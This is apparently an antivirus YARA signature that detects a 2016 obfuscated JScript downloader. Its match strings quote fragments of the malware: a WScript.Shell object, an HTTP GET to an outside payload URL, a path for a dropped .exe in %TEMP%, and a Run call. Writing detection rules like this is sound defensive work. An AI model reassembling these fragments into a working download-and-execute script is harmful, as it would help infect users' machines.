rule sig_20160329_597825de4ee82223a9ddd9e8e332340e {
  meta:
    description = "datamaliciousorder - file 20160329_597825de4ee82223a9ddd9e8e332340e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "92c5591b22e0d52e66877b5114bf36d850e5c8b00e50d8d912d0047aaa535813"

  strings:
    $s1  = "function Taxdramksm() {return Tshnkqe[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"SJGJOvsLCS8l.exe\";};" fullword ascii
    $s2  = "Mfexyvos[Pxklmifjg](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Hcumoekk](Lvuwfgl() * 11)} while (Mfexyvos[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Mjqcrnr(Xhzcpznse, Iomyj){return Xhzcpznse - Iomyj;};" fullword ascii
    $s5  = "var Tshnkqe = function Cfrkdfsqtn() {return WScript[Kfcfxdwmfi](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Wcxykft(Glmzfndwie){Tshnkqe[\"Run\"](Glmzfndwie, Iwkergvzvi, Iwkergvzvi);};" fullword ascii
    $s7  = "Pwvsj = true; " fullword ascii
    $s8  = "var Okktuvknr = false;" fullword ascii
    $s9  = "var Pjxeb = false;" fullword ascii
    $s10 = "Pjxeb = true; " fullword ascii
    $s11 = " while (Hpnrnz){" fullword ascii
    $s12 = "var Pwvsj = false;" fullword ascii
    $s13 = "function Lvuwfgl(){return 22;};" fullword ascii
    $s14 = "function Zmmdehv(){return Kfcfxdwmfi;};" fullword ascii
    $s15 = "function Dntlorfzbk(Rwapvqvify) {var Ddlhe = (1, 2, 3, 4, 5, Rwapvqvify); return Ddlhe;};" fullword ascii
    $s16 = "var Xswesnv = new this[\"Date\"]();" fullword ascii
    $s17 = "function Kgufxqi()" fullword ascii
    $s18 = "return Mjqcrnr(Xprjbue, Nmznw);" fullword ascii
    $s19 = "function Ulwvjahzm(){return Egogafkyqw;};" fullword ascii
    $s20 = "function Pgosca() {return ((Pwvsj == true) && (Pwvsj == Pjxeb)) ? 1 : Iwkergvzvi;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}